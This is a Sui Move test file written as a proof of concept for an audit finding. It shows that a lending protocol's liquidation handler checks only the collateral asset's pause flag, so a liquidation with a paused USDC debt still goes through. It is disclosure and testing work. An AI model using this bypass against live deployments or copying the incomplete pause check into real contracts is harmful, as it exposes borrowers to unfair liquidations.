// PoC for Report #029: Normal Liquidation Only Checks Collateral Pause, Not Debt Pause
//
// Target: contracts/protocol/sources/internal/market/market.move:519-520
// Place in: contracts/protocol/tests/integration/test_cases/
// Run:   sui move test --filter poc_029
//
// Bug: handle_liquidation only checks collateral asset's liquidation_paused
//      flag (what=3), not the debt asset's. An admin can pause USDC for
//      liquidation, but liquidation with USDC as DEBT still proceeds.
//
// Severity upgrade angle (Low → Medium):
//   When admin pauses an asset due to oracle issues (price feed manipulation
//   or stale oracle), liquidation should be blocked for that asset in ALL
//   roles (both debt and collateral). The missing check means emergency
//   controls are incomplete — liquidators can still use bad oracle data
//   to execute unfair liquidations against the paused asset's debt positions.
//
// Expected: test PASSES, proving liquidation succeeds despite debt pause

#[test_only]
module protocol::poc_029_liquidation_debt_pause_bypass {
    use sui::test_scenario;
    use sui::clock;

    use protocol::market_t::MainMarket;
    use test_coin::eth::ETH;
    use test_coin::usdc::USDC;
    use protocol::oracle_t;
    use protocol::open_obligation_t;
    use protocol::market_t::default_eth_decimal_places;
    use protocol::market_t::default_stable_decimal_places;

    const ADMIN: address = @0xAD;
    const BORROWER: address = @0xBB;
    const LIQUIDATOR: address = @0xCC;

    /// what=3 corresponds to LiquidationPaused in asset.move:change_operation_status
    const LIQUIDATION_PAUSE: u8 = 3;

    /// Proves that pausing USDC for liquidation does NOT block liquidation
    /// when USDC is the DEBT asset (only blocks when USDC is collateral).
    ///
    /// Scenario:
    ///   1. Borrower deposits ETH, borrows USDC
    ///   2. Admin pauses USDC for liquidation (emergency: oracle issue)
    ///   3. ETH price drops → position liquidatable
    ///   4. Liquidator liquidates with USDC as debt → SUCCEEDS (bug!)
    ///
    /// In contrast, if USDC were the collateral, the pause WOULD block it.
    /// This asymmetry means emergency controls are incomplete.
    #[test]
    fun test_liquidation_proceeds_despite_debt_asset_paused() {
        let mut scenario_value = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_value;
        let mut clock = clock::create_for_testing(scenario.ctx());

        // Step 1: Init market
        let (admin_cap, mut app, mut market, coin_registry) =
            protocol::app_t::default_app_init<MainMarket>(scenario, &mut clock, ADMIN);
        let mut x_oracle = oracle_t::init_t(scenario);

        // Step 2: Set prices
        clock.set_for_testing(100_000);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

        // Step 3: Borrower deposits 1 ETH ($1000), borrows 600 USDC
        scenario.next_tx(BORROWER);
        let borrower_cap = open_obligation_t::open_obligation_t<MainMarket>(
            scenario, &app, &mut market
        );
        let eth_coin = sui::coin::mint_for_testing<ETH>(
            1 * 10u64.pow(default_eth_decimal_places()), scenario.ctx()
        );
        protocol::deposit::deposit<MainMarket, ETH>(
            &app, &mut market, &borrower_cap, eth_coin, &clock, scenario.ctx()
        );

        scenario.next_tx(BORROWER);
        let borrow_amount = 600 * 10u64.pow(default_stable_decimal_places());
        let borrowed = protocol::borrow::borrow<MainMarket, USDC>(
            &app, &borrower_cap, &mut market, &coin_registry,
            borrow_amount, &x_oracle, &clock, scenario.ctx()
        );
        std::unit_test::destroy(borrowed);

        // Step 4: Admin pauses USDC for liquidation (emergency control)
        // Intent: "USDC oracle is unreliable, stop all liquidations involving USDC"
        scenario.next_tx(ADMIN);
        protocol::asset_admin::update_asset_paused_state<MainMarket, USDC>(
            &admin_cap, &app, &mut market,
            LIQUIDATION_PAUSE,  // what=3 → LiquidationPaused
            true                // paused = true
        );

        // Step 5: ETH price drops to $800 → position becomes liquidatable
        // Weighted collateral = $800 * 70% = $560 < $600 debt
        clock.set_for_testing(101_000);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(800, 0));
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

        // Step 6: Liquidator attempts liquidation with USDC as DEBT
        // BUG: handle_liquidation only checks collateral (ETH) pause state,
        //      not debt (USDC) pause state.
        //      ETH is NOT paused → check passes → liquidation proceeds!
        scenario.next_tx(LIQUIDATOR);
        let repay_amount = 300 * 10u64.pow(default_stable_decimal_places());
        let repay_coin = sui::coin::mint_for_testing<USDC>(repay_amount, scenario.ctx());

        let permit = protocol::whitelist_admin::mint_new_whitelist(
            &admin_cap, &mut app, scenario.ctx()
        );
        protocol::whitelist_admin::update_permission(
            &admin_cap, &mut app, object::id(&permit),
            protocol::whitelist_admin::liquidation(), true
        );

        // This SHOULD fail because USDC is paused for liquidation,
        // but it SUCCEEDS because only collateral pause is checked.
        let (seized_eth, refund_usdc) =
            protocol::liquidate::liquidate_as_coin<MainMarket, USDC, ETH>(
                &app, &permit, borrower_cap.id(), &mut market,
                repay_coin, &coin_registry, &x_oracle, &clock, scenario.ctx()
            );

        // BUG PROVEN: Liquidation succeeded despite USDC being paused
        assert!(seized_eth.value() > 0, 0);

        // Impact: If USDC oracle was compromised (reason for pause),
        // the liquidator may have used incorrect USDC pricing to
        // compute seizure amounts, unfairly liquidating the borrower.

        // Cleanup
        std::unit_test::destroy(seized_eth);
        std::unit_test::destroy(refund_usdc);
        clock::destroy_for_testing(clock);
        test_scenario::return_shared(market);
        std::unit_test::destroy(admin_cap);
        std::unit_test::destroy(borrower_cap);
        std::unit_test::destroy(app);
        std::unit_test::destroy(permit);
        std::unit_test::destroy(x_oracle);
        std::unit_test::destroy(coin_registry);
        scenario_value.end();
    }
}
